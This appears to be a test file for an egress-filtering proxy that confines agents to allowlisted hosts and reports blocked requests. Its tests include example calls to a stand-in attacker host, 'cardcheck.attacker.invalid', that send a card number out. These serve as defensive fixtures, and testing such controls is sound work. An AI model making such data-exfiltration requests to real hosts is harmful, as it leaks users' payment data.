import { afterAll, beforeAll, expect, test } from 'vitest';
import http from 'node:http';
import net from 'node:net';
import type { AddressInfo } from 'node:net';
import { createProxy, type ProxyHandle } from '../src/server.js';

const ADMIN = 'admin-secret';
const EVENTS = 'events-secret';
let echo: http.Server;
let events: http.Server;
let proxy: ProxyHandle;
let echoPort: number;
const received: { headers: http.IncomingHttpHeaders; body: any }[] = [];

const listen = (s: http.Server) => new Promise<number>((r) => s.listen(0, '127.0.0.1', () => r((s.address() as AddressInfo).port)));

function viaProxy(url: string): Promise<{ status: number; body: string }> {
  return new Promise((resolve, reject) => {
    const req = http.request({ host: '127.0.0.1', port: proxy.proxyPort, method: 'GET', path: url, headers: { host: new URL(url).host } }, (res) => {
      let body = '';
      res.on('data', (c) => (body += c));
      res.on('end', () => resolve({ status: res.statusCode!, body }));
    });
    req.on('error', reject);
    req.end();
  });
}

function connectVia(target: string): Promise<string> {
  return new Promise((resolve, reject) => {
    const sock = net.connect(proxy.proxyPort, '127.0.0.1', () => sock.write(`CONNECT ${target} HTTP/1.1\r\nHost: ${target}\r\n\r\n`));
    let data = '';
    sock.on('data', (c) => { data += c; if (data.includes('\r\n\r\n')) { sock.destroy(); resolve(data); } });
    sock.on('error', reject);
  });
}

async function waitFor(pred: () => boolean, ms = 2000) {
  const end = Date.now() + ms;
  while (!pred() && Date.now() < end) await new Promise((r) => setTimeout(r, 20));
}

beforeAll(async () => {
  echo = http.createServer((req, res) => res.end(`echo ${req.url}`));
  echoPort = await listen(echo);
  events = http.createServer((req, res) => {
    let b = '';
    req.on('data', (c) => (b += c));
    req.on('end', () => { received.push({ headers: req.headers, body: JSON.parse(b) }); res.end('ok'); });
  });
  const eventsPort = await listen(events);
  proxy = await createProxy({ proxyPort: 0, adminPort: 0, host: '127.0.0.1', adminToken: ADMIN, eventsUrl: `http://127.0.0.1:${eventsPort}/internal/proxy-events`, eventsToken: EVENTS });
  const res = await fetch(`http://127.0.0.1:${proxy.adminPort}/policy/127.0.0.1`, {
    method: 'PUT',
    headers: { 'content-type': 'application/json', 'x-admin-token': ADMIN },
    body: JSON.stringify({ runId: 'r1', agent: 'blind', mode: 'demo', allowHosts: [`127.0.0.1:${echoPort}`] }),
  });
  expect(res.status).toBe(204);
});

afterAll(async () => {
  await proxy?.close();
  echo?.close();
  events?.close();
});

test('admin API rejects a bad token', async () => {
  const res = await fetch(`http://127.0.0.1:${proxy.adminPort}/policy/10.0.0.9`, { method: 'PUT', headers: { 'x-admin-token': 'nope' }, body: '{}' });
  expect(res.status).toBe(401);
});

test('allowlisted request is forwarded', async () => {
  const r = await viaProxy(`http://127.0.0.1:${echoPort}/hello`);
  expect(r).toEqual({ status: 200, body: 'echo /hello' });
});

test('non-allowlisted request is blocked and reported exactly once', async () => {
  received.length = 0;
  const r = await viaProxy('http://cardcheck.attacker.invalid/verify?card=4242');
  expect(r.status).toBe(403);
  expect(r.body).toBe('Blocked by Earshot egress policy');
  await waitFor(() => received.length > 0);
  await new Promise((r) => setTimeout(r, 100));
  expect(received).toHaveLength(1);
  expect(received[0]!.headers['x-events-token']).toBe(EVENTS);
  expect(received[0]!.body).toEqual({ ip: '127.0.0.1', method: 'GET', host: 'cardcheck.attacker.invalid', path: '/verify?card=4242', reason: 'not-allowlisted' });
});

test('CONNECT to a non-allowlisted host is refused with an empty path', async () => {
  received.length = 0;
  const head = await connectVia('cardcheck.attacker.invalid:443');
  expect(head).toMatch(/^HTTP\/1\.1 403/);
  await waitFor(() => received.length > 0);
  expect(received[0]!.body).toMatchObject({ method: 'CONNECT', host: 'cardcheck.attacker.invalid', path: '', reason: 'not-allowlisted' });
});

test('policy deletion makes the source unknown', async () => {
  const del = await fetch(`http://127.0.0.1:${proxy.adminPort}/policy/127.0.0.1`, { method: 'DELETE', headers: { 'x-admin-token': ADMIN } });
  expect(del.status).toBe(204);
  received.length = 0;
  const r = await viaProxy(`http://127.0.0.1:${echoPort}/hello`);
  expect(r.status).toBe(403);
  await waitFor(() => received.length > 0);
  expect(received[0]!.body.reason).toBe('no-policy');
});
